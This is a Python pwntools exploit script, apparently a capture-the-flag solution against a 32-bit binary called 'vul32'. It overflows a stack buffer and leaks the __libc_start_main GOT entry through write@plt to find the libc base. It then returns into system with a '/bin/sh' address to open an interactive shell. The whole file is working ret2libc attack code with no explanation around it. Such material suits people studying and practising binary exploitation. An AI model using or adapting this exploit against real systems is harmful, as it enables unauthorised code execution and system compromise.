from pwn import *

# context.log_level = 'debug'

# context.terminal = ['tmux','splitw','-h']
sh = process('./vul32')
elf = ELF('./vul32')
# pwnlib.gdb.attach(proc.pidof(sh)[0])
# sh = remote('cssc.vul337.team', 49244)
# conn.recvline()

func_plt = elf.plt['write']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']
payload = flat(
    ['a' * 0x33, 'G', func_plt, main,
     p32(1), libc_start_main_got,
     p32(4)])
sh.sendlineafter('Plz input something:\n', payload)
sh.recvline()
re = sh.recv()[0:4]

libc = ELF('libc.so.6')
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']

print(hex(libc_start_main_offset))
print(hex(system_offset))
print(re)
libc_start_main_addr = u32(re)
libcbase = libc_start_main_addr - libc_start_main_offset
system_addr = libcbase + system_offset
binsh_addr = libcbase + 0x15912b

payload = flat(['a' * 0x33, 'G', system_addr, 'bbbb', binsh_addr])
sh.sendline(payload)

sh.recvline()
sh.interactive()
sh.close()